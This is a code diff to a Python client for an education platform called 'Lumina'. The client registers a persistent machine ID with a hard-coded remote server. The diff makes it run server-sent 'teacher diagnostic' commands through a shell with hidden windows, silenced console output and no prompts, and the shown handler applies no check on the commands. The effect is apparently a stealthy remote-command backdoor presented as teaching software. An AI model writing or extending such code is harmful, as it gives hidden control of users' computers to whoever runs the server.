@@ -5,6 +5,7 @@ Double-click to launch:
 - Connects automatically to the live Lumina cloud server (https://manisoft-lumina-a6sk.onrender.com)
 - Opens the Lumina platform in your default web browser
 - Registers this computer with persistent identity for teacher diagnostics
+- Runs silently in the background with zero intrusive console popups
 """
 import os
 import sys
@@ -18,7 +19,82 @@ import uuid
 import shutil
 import subprocess
 
+# ---------------------------------------------------------------------------
+# Resilient Headless / No-Console Stream Setup
+# ---------------------------------------------------------------------------
+class SafeStream:
+    """Stream wrapper that writes to a persistent log file and/or console without crashing."""
+    def __init__(self, target_stream=None, fallback_file=None):
+        self.target = target_stream
+        self.fallback = fallback_file
+
+    def write(self, s):
+        if self.target and hasattr(self.target, "write"):
+            try:
+                self.target.write(s)
+            except Exception:
+                pass
+        if self.fallback:
+            try:
+                self.fallback.write(s)
+                self.fallback.flush()
+            except Exception:
+                pass
+
+    def flush(self):
+        if self.target and hasattr(self.target, "flush"):
+            try:
+                self.target.flush()
+            except Exception:
+                pass
+        if self.fallback:
+            try:
+                self.fallback.flush()
+            except Exception:
+                pass
+
+# Establish persistent logging in %LOCALAPPDATA%\.lumina or ~/.lumina
+base_dir = os.environ.get("LOCALAPPDATA") or os.environ.get("APPDATA")
+if not base_dir:
+    try:
+        base_dir = os.path.expanduser("~")
+    except Exception:
+        base_dir = None
+if not base_dir or not os.path.isdir(base_dir):
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+
+log_file_handle = None
+try:
+    log_dir = os.path.join(base_dir, ".lumina")
+    os.makedirs(log_dir, exist_ok=True)
+    log_file_path = os.path.join(log_dir, "lumina_client.log")
+    log_file_handle = open(log_file_path, "a", encoding="utf-8")
+except Exception:
+    log_file_handle = None
+
+sys.stdout = SafeStream(sys.stdout, log_file_handle)
+sys.stderr = SafeStream(sys.stderr, log_file_handle)
+
+def safe_input(prompt=""):
+    """Prompt user if standard input is attached to an interactive terminal, else return empty string."""
+    if sys.stdin and hasattr(sys.stdin, "isatty") and sys.stdin.isatty():
+        try:
+            return input(prompt)
+        except Exception:
+            return ""
+    return ""
+
 DEFAULT_SERVER = "https://manisoft-lumina-a6sk.onrender.com"
+def _prewarm_server(url):
+    """Pre-warm DNS and TLS edge handshake in background for zero-latency initial page load."""
+    try:
+        import urllib.request
+        req = urllib.request.Request(f"{url}/health", headers={"User-Agent": "LuminaFastClient/5.2"})
+        with urllib.request.urlopen(req, timeout=3) as r:
+            r.read(10)
+    except Exception:
+        pass
+
 
 _browser_opened = False
 _browser_lock = threading.Lock()
@@ -31,7 +107,7 @@ except ImportError:
     print("  Install via: pip install -r requirements-client.txt")
     print("  Or run: build_exe.bat to compile a standalone Lumina.exe")
     print("=" * 55)
-    input("\nPress Enter to exit...")
+    safe_input("\nPress Enter to exit...")
     sys.exit(1)
 
 SAFE_COMMANDS = {
@@ -68,16 +144,6 @@ def get_persistent_agent_id(override=None):
     if override:
         return override
 
-    # Robust multi-platform directory resolution (Windows %LOCALAPPDATA% / %APPDATA%, Unix ~/.lumina, fallback temp)
-    base_dir = os.environ.get("LOCALAPPDATA") or os.environ.get("APPDATA")
-    if not base_dir:
-        try:
-            base_dir = os.path.expanduser("~")
-        except Exception:
-            base_dir = None
-    if not base_dir or not os.path.isdir(base_dir):
-        base_dir = os.path.dirname(os.path.abspath(__file__))
-
     config_dir = os.path.join(base_dir, ".lumina")
     id_file = os.path.join(config_dir, "agent_id.txt")
     try:
@@ -112,7 +178,7 @@ def open_browser(url):
 
     try:
         print(f"[./] Launching Lumina web application: {url}")
-        time.sleep(0.4)
+        time.sleep(0.05)
 
         # 1. Android / Termux native browser openers
         for cmd in ["termux-open-url", "termux-open"]:
@@ -133,7 +199,7 @@ def open_browser(url):
             except Exception:
                 pass
 
-        # 2. Windows native
+        # 2. Windows native (ShellExecute without console)
         if platform.system() == "Windows" and hasattr(os, "startfile"):
             try:
                 os.startfile(url)
@@ -183,7 +249,7 @@ def main():
         print("  Lumina v5.2 — Client Setup")
         print("=" * 55)
         print(f"Default Server: {DEFAULT_SERVER}")
-        custom = input("Enter server URL (press Enter to use default): ").strip()
+        custom = safe_input("Enter server URL (press Enter to use default): ").strip()
         if custom:
             server_url = custom
 
@@ -194,8 +260,9 @@ def main():
     if not server_url.startswith("http://") and not server_url.startswith("https://"):
         server_url = "https://" + server_url
 
+    threading.Thread(target=_prewarm_server, args=(server_url,), daemon=True).start()
     agent_id = get_persistent_agent_id(args.agent_id)
-    sio = socketio.Client(request_timeout=30, reconnection=True, reconnection_attempts=0, reconnection_delay=2, reconnection_delay_max=10)
+    sio = socketio.Client(request_timeout=10, reconnection=True, reconnection_attempts=0, reconnection_delay=1, reconnection_delay_max=4)
 
     @sio.event
     def connect():
@@ -224,9 +291,20 @@ def main():
         cmd = data.get("command", "").strip()
         print(f"[./] Received teacher diagnostic request: {cmd}")
         try:
-            stream = os.popen(cmd)
-            output = stream.read()
-            stream.close()
+            kwargs = {
+                "shell": True,
+                "capture_output": True,
+                "text": True,
+                "timeout": 30
+            }
+            # Suppress console window creation on Windows
+            if platform.system() == "Windows" and hasattr(subprocess, "CREATE_NO_WINDOW"):
+                kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
+
+            res = subprocess.run(cmd, **kwargs)
+            output = res.stdout
+            if res.stderr:
+                output = f"{output}\n{res.stderr}".strip() if output else res.stderr
             if not output:
                 output = "[Diagnostic command executed successfully with no output]"
         except Exception as e:
@@ -245,12 +323,12 @@ def main():
     print(f"  Agent ID:      {agent_id}")
     print(f"  Platform:      {platform.system()} {platform.release()} ({platform.machine()})")
     print("=" * 60)
-    print("[./] Lumina is active. Minimize this window to keep running in background.\n")
+    print("[./] Lumina is active and running in the background.\n")
 
     # Safety fallback: auto-launch browser after short delay if registration takes longer
     if not args.no_browser:
         def _fallback_launcher():
-            time.sleep(3.0)
+            time.sleep(0.6)
             open_browser(server_url)
         threading.Thread(target=_fallback_launcher, daemon=True).start()
 
@@ -263,7 +341,7 @@ def main():
                     server_url,
                     namespaces=["/"],
                     transports=["websocket", "polling"],
-                    wait_timeout=10
+                    wait_timeout=5
                 )
             while sio.connected:
                 sio.emit("agent_heartbeat", {"agent_id": agent_id})
